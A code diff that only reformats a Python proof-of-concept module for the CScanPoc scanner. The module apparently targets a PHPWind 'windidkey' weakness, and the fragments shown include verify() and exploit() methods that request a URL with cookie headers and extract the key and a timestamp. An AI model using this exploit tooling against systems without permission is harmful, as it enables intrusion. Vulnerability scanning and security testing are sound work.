@@ -1,9 +1,13 @@
 # coding: utf-8
 import re
 import time
-import urllib.request, urllib.parse, urllib.error
+import urllib.request
+import urllib.parse
+import urllib.error
 import json
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 from hashlib import md5
 
 from CScanPoc.thirdparty import requests, hackhttp
@@ -45,9 +49,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -61,7 +66,8 @@ class Poc(ABPoc):
             match_windidkey = re.compile(
                 'windidkey%3D([\\w\\d]{32})%26time%3D([\\d]+)%26')
 
-            request = urllib.request.Request(windidkey_url, headers=headers_cookie)
+            request = urllib.request.Request(
+                windidkey_url, headers=headers_cookie)
             response = urllib.request.urlopen(request).read()
 
             # Get windidkey
@@ -88,7 +94,8 @@ class Poc(ABPoc):
             self.output.info('执行异常：{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
@@ -103,7 +110,8 @@ class Poc(ABPoc):
             match_windidkey = re.compile(
                 'windidkey%3D([\\w\\d]{32})%26time%3D([\\d]+)%26')
 
-            request = urllib.request.Request(windidkey_url, headers=headers_cookie)
+            request = urllib.request.Request(
+                windidkey_url, headers=headers_cookie)
             response = urllib.request.urlopen(request).read()
 
             # Get windidkey
